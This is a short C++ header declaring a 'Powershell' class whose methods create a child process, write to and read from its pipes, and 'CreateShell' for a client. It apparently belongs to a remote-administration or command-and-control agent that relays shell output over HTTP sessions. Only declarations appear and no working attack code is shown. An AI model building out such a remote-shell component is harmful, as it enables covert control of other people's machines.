#pragma once
#include <windows.h>
#include <ctype.h>
#include "Encryptions.h"
#include "Utils.h"
#include "HttpRequests.h"
#include "JsonFunctions.h"


class Powershell
{
#define BUF 90000

public:
	bool CreateChildProcess();

	static void WriteToPipe(string hxcer);

	static void ReadFromPipe(char* c, HINTERNET clientInfoSession, string clientId);

	bool CreateShell(PublicStructers::client clientInfo);

};